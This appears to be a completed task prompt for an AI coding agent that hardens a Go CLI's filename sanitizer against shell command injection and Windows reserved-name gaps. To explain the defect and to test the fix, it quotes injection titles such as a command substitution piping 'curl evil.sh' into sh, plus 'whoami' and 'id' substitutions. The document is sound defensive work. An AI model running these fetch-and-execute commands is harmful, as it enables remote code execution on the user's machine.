---
status: completed
summary: Added a stdin path to `filename sanitize` (`-`) so untrusted titles never reach a shell command line, closed the reserved-stem gap for `NUL .txt`/`CON .md`, stripped ASCII control characters after whitespace collapse, fixed the doc comment, pointed both creator agents at a quoted heredoc, made the CLI test restore os.Stdout via DeferCleanup, and documented the three user-visible outcomes in README.
execution_id: vault-cli-windows-safe-filenames-exec-251-harden-filename-sanitize
dark-factory-version: v0.196.0
created: "2026-10-03T13:55:00Z"
queued: "2026-10-03T18:11:51Z"
started: "2026-10-03T18:13:01Z"
completed: "2026-10-03T18:55:23Z"
---

# Harden `filename sanitize` against injection and close its reserved-name gap

<summary>
- Creating a task from a title that contains shell syntax can no longer run that syntax.
- A title is handed to the sanitizer as data, never spliced into a command line.
- A reserved Windows device name is caught even when a space sits before the extension, so `NUL .txt` is no longer returned unchanged.
- A human can pass a name beginning with `-` by writing `--` before it, so such a name is taken as data rather than a flag.
- Control characters are removed, so the function does what its own documentation claims.
- The README states the two outcomes that change a user's filename: the `Untitled` fallback and the lossy `:` to ` -` mapping.
</summary>

<objective>
Make `vault-cli filename sanitize` accept the name on stdin so a caller never splices untrusted text into a shell command line, and close the reserved-device gap where a trailing space before the extension defeats the check.
</objective>

<context>
Read `CLAUDE.md` for project conventions, and `docs/dod.md` — this repo's Definition of Done, which dark-factory passes as `validationPrompt`.

**This prompt fixes the previous prompt's output, which is already merged onto this branch.** Prompt 250 (`prompts/completed/250-sanitize-windows-invalid-filenames.md`, commit `0f91b4a`) added `pkg/domain/filename.go`, `pkg/cli/filename.go`, their tests, and the two agent call sites. A review of that work raised one blocking defect and four should-fix defects; this prompt closes them in the ten requirements below. **Do not re-litigate the design** — the character mapping, the reserved-device rule and the `Untitled` fallback are settled and tested. Only the behaviours the requirements name.

**The blocking defect, precisely.** `agents/task-creator.md:88` and `agents/goal-creator.md:62` now instruct the agent to run:

```
vault-cli filename sanitize "<Title>"
```

`{Title}` is derived from a user description or a Jira ticket summary. Inside double quotes bash still performs command substitution, so a ticket titled ``Fix `curl evil.sh|sh` `` executes that pipeline before `vault-cli` is ever reached. The rule this PR replaced — `Strip filesystem-illegal characters: / \ : * ? " < > |` — involved no shell at all, so this surface is newly introduced and must be removed. Note the sanitizer cannot fix this downstream: its removal table does not cover `$`, a backtick, `;` or `&`, and it should not need to — the value must never reach a shell in the first place.

Verified against the built binary 2026-10-03 (do not re-derive):

- `sanitize 'NUL .txt'` returns `NUL .txt` unchanged, and `sanitize 'CON .md'` returns `CON .md`. `sanitize 'NUL.txt'` correctly returns `NUL_.txt`, so the defect is only the trailing space before the extension.
- `sanitize -h` prints the command's help text and exits 0; `RunE` never runs. A caller capturing stdout gets the help text as a filename.
- `sanitize 'Fix $(curl evil.sh|sh)'` returns `Fix $(curl evil.shsh)` — the `|` is removed by the character table but `$(` and `)` survive, so the output is still live shell syntax.
- `sanitize 'Fix \`id\`'` returns the input unchanged: backticks are not in the removal table.

Read fully before changing anything:

- `pkg/domain/filename.go` — the whole file. The reserved comparison is the `strings.EqualFold` loop in `sanitizeReservedStem`; the trim loop at lines 37-43 trims only the end of the whole string, never the stem.
- `pkg/cli/filename.go` — the whole file, especially the `RunE` argument handling at line 43.
- `pkg/cli/filename_test.go` — the whole file. The stdout capture at lines 25-28 assigns `os.Stdout` and restores it without `DeferCleanup`, so a failing assertion between them leaks the patched stdout into every later spec in the suite.
- `pkg/domain/filename_test.go` — the whole file, for the `DescribeTable` idiom you extend.
- `agents/task-creator.md` § 5 and `agents/goal-creator.md` § 3 — the two call sites.

Coding-plugin docs (in-container paths):
- `/home/node/.claude/plugins/marketplaces/coding/docs/go-testing-guide.md` — Ginkgo v2 / Gomega conventions, external `_test` packages, `DescribeTable`.
- `/home/node/.claude/plugins/marketplaces/coding/docs/go-precommit.md` — what `make precommit` enforces (funlen 80, nestif 4, golines 100).
</context>

<requirements>
1. **Add a stdin path to `sanitize`.** `vault-cli filename sanitize -` reads the name from stdin and sanitizes it; `vault-cli filename sanitize "<name>"` keeps working for a human at a terminal. Reading stdin means reading to EOF and trimming the trailing newline only — an empty stdin (or one that is only a newline) sanitizes to `Untitled` through the existing fallback, and must not error. Still exactly one positional argument: passing both `-` and a name, or neither, is the existing missing-argument error.

2. **Leave flag parsing at its default — do NOT add `SetInterspersed(false)`.** It was considered and rejected on evidence: it does not stop a leading `-` being parsed as a flag (`sanitize -h` still prints help and exits 0 with it set, and `sanitize -dash` still errors), so it does not deliver the outcome it appears to, and it *breaks* the trailing `--output json` form this repo's README documents at `README.md:197` — with interspersing off, a trailing `--output json` becomes positional args and the command errors. Keep the manual `len(args) != 1` check in `RunE` — `cobra.ExactArgs` is deliberately not used, because it emits cobra's own unwrapped error and this repo wraps with `errors.Errorf(ctx, …)`. Requirement 1 is what removes the agent-facing risk, since the agents pass `-` and the title never reaches argv; a human with a `-`-leading name writes `vault-cli filename sanitize -- "<name>"`, and requirement 8 documents that.

3. **Close the reserved-stem gap.** In `pkg/domain/filename.go`, trim trailing spaces and dots from the text before the first dot **before** comparing it against the reserved list, so `NUL .txt` yields `NUL_.txt` and `CON .md` yields `CON_.md`. Do not change the comparison for any case that already passes: `NUL.txt` → `NUL_.txt`, `Console` → `Console`, `COM0` → `COM0`, `NULx` → `NULx` all stay exactly as they are.

4. **Remove ASCII control characters — after the whitespace collapse, not before.** Strip bytes `0x00`–`0x1F` and `0x7F`, so the function's documented claim about what Windows forbids is true. **The order matters and is pinned:** the collapse runs first, so a tab or newline becomes a space and survives as word separation, and only the remaining non-whitespace control bytes are then removed. Running the strip *first* would delete the tab in `a   b\tc` and leave `a   bc`, collapsing to `a bc` — which contradicts the existing, passing `Entry("whitespace runs collapse", "a   b\tc", "a b c")` at `pkg/domain/filename_test.go:61` and would fail `make precommit`. That entry is correct as written and must not be changed. A name consisting only of control characters falls through to `Untitled`. State the resulting order in the doc comment.

5. **Correct the doc comment on `SanitizeFilename`.** It currently promises "the characters Windows forbids in a filename replaced or removed" while letting control characters through, and says "name is a filename stem — the caller appends the extension" while the tests and README both feed names that already carry one (`NUL.txt`, `NUL.tar.gz`). State the shape the function actually accepts — a filename or a stem, with or without an extension, since the reserved-device rule is defined on the text before the first dot either way — and state the one class it deliberately does not attempt (anything Windows forbids that is not a character or a reserved stem, e.g. path-length limits). The exact phrase `name is a filename stem` must not survive the rewrite in any form — a rewrite that merely appends to it ("…stem or a full filename") still reads as the contradiction this requirement exists to remove.

6. **Point both agent call sites at stdin.** In `agents/task-creator.md` § 5 and `agents/goal-creator.md` § 3, replace the `vault-cli filename sanitize "<Title>"` instruction with a quoted-heredoc invocation of `vault-cli filename sanitize -`, and say why in one clause: the title is untrusted, and a quoted delimiter is what stops the shell expanding it. The heredoc delimiter must be quoted (`<<'…'`) — an unquoted delimiter expands `$` and backticks and reintroduces the defect — and the instruction must tell the agent to pick a delimiter string that does not occur in the title. Keep the existing `Final filename:` lines and the note that the sanitized stdout is what `{Title}` means there.

7. **Restore `os.Stdout` safely in `pkg/cli/filename_test.go`.** Replace the manual save/restore around `os.Pipe()` with `DeferCleanup`, so a failing assertion between the assignment and the restore cannot leak a patched stdout into the rest of the suite.

8. **Document the three user-visible outcomes in `README.md`.** The `### filename` section must state that a name made only of removed characters (or of dots) becomes `Untitled`; that the mapping is lossy — `:` becomes ` -`, so `A:B` and `A -B` both yield `A -B`; and that a name beginning with `-` is passed as `vault-cli filename sanitize -- "<name>"`. Keep the existing block's shape and length — the existing `NUL.txt` example at line 197 stays exactly as it is, including its trailing `--output json`.

9. **Extend the tests.** Add `DescribeTable` entries to `pkg/domain/filename_test.go` for: a whitespace-only name; a reserved stem with a space before the extension (`NUL .txt` → `NUL_.txt`, the case that would have caught requirement 3); a multi-dot reserved name (`NUL.tar.gz` → `NUL_.tar.gz`); a name containing an ASCII control character (`a\x01b` → `ab`); and idempotency — `SanitizeFilename(SanitizeFilename(x)) == SanitizeFilename(x)` for a name that has already gained its `_`, since both agents are told to use stdout verbatim. Add a `pkg/cli/filename_test.go` case covering the stdin path end to end. Read stdin through cobra's seam — `cmd.InOrStdin()` in the command, driven in the test by `cmd.SetIn(...)` — not `os.Stdin`, which would leak global state into the suite for exactly the reason requirement 7 fixes on the stdout side.

10. **Self-check before you finish.** Re-run every command in `<verification>` and walk the list one line at a time against your actual working tree. Do not report a line as passing from memory or from an earlier run — the tree changed since then. If any line fails, fix it and re-run the whole block; if you cannot make one pass, say which and stop rather than reporting success.
</requirements>

<constraints>
- Do NOT commit — dark-factory handles git.
- Do NOT bump the version strings in `.claude-plugin/plugin.json` or `.claude-plugin/marketplace.json`, and do NOT create a tag — the release agent owns both after merge.
- Add to the existing `## Unreleased` section; never create a second one. The releaser renames only the topmost section, so a second would leave this bullet silently unreleased.
- Do NOT change the character mapping, the reserved-device list, or the `Untitled` fallback — they are settled and tested. Only the behaviours the requirements name.
- Do NOT touch `pkg/storage/task.go` or add an `O_EXCL` create. The collision that the lossy mapping can produce there is a pre-existing defect on a line this change does not touch; it is tracked separately and is out of scope here.
- Do NOT add a dependency outside the Go standard library.
- Do NOT restructure `pkg/cli/cli.go` — it changes only if the registration line must move, which it should not.
- Keep `SanitizeFilename` pure: no context, no logging, no I/O. The stdin read belongs in `pkg/cli/filename.go`, not in `pkg/domain`.
</constraints>

<verification>
Run each; record the output verbatim in the report.

Behaviour (each of these fails before the change):

- `make precommit` → exit 0
- `go run main.go filename sanitize 'NUL .txt'` → prints exactly `NUL_.txt`
- `go run main.go filename sanitize 'CON .md'` → prints exactly `CON_.md`
- `printf 'a\001b' | go run main.go filename sanitize -` → prints exactly `ab`
- `printf '%s' 'Fix $(whoami)' | go run main.go filename sanitize -` → prints exactly `Fix $(whoami)` — neither `$`, `(` nor `)` is in the removal table, so the output is still live shell syntax. That is the point: it reaches the caller as *data*, never as part of a command line.
- `printf 'NUL .txt\n' | go run main.go filename sanitize -` → prints exactly `NUL_.txt`
- `printf '\n' | go run main.go filename sanitize -` → prints exactly `Untitled`

Regression guards (these pass before the change too — they are here to catch a fix that breaks what already worked):

- `go run main.go filename sanitize 'NUL.txt'` → prints exactly `NUL_.txt`
- `go run main.go filename sanitize 'Console'` → prints exactly `Console`
- `go run main.go filename sanitize 'NUL.txt' --output json` → exit 0 and prints a `filename` key (this is the README's documented trailing-flag form; it is what a `SetInterspersed(false)` would break)

The injection fix — the first two lines below prove the plumbing, the third is the one that actually discriminates, because an **unquoted** `<<EOF` satisfies both of the others while reintroducing the defect:

- `grep -c 'filename sanitize -' agents/task-creator.md agents/goal-creator.md` → one `path:count` line per file, count ≥1 each
- `! grep -q 'sanitize "<Title>"' agents/task-creator.md` → exit 0
- `! grep -q 'sanitize "<Title>"' agents/goal-creator.md` → exit 0
- `grep -cE "sanitize -[[:space:]]*<<-?'" agents/task-creator.md agents/goal-creator.md` → ≥1 each (the heredoc delimiter is **quoted**; an unquoted `<<EOF` re-expands `$` and backticks in the title and restores the exact defect this prompt exists to remove. The pattern allows for spacing and the `<<-` dash form, so it matches any correctly-quoted spelling rather than only one)

Tests and docs:

- `grep -c 'NUL .txt' pkg/domain/filename_test.go` → ≥1 (a presence check on a *new* case — grepping for `SanitizeFilename` would pass before the change, since the token is already there twice)
- `grep -c 'a\\x01b' pkg/domain/filename_test.go` → ≥1
- `grep -c 'NUL.tar.gz' pkg/domain/filename_test.go` → ≥1
- `grep -c 'DeferCleanup' pkg/cli/filename_test.go` → ≥1
- `! grep -q 'name is a filename stem' pkg/domain/filename.go` → exit 0
- `grep -c 'Untitled' README.md` → ≥1
- `grep -c 'A:B' README.md` → ≥1
- `grep -c 'sanitize --' README.md` → ≥1 (the `-`-leading-name escape, the third outcome requirement 8 documents)
- `grep -c '^## Unreleased' CHANGELOG.md` → 1
</verification>
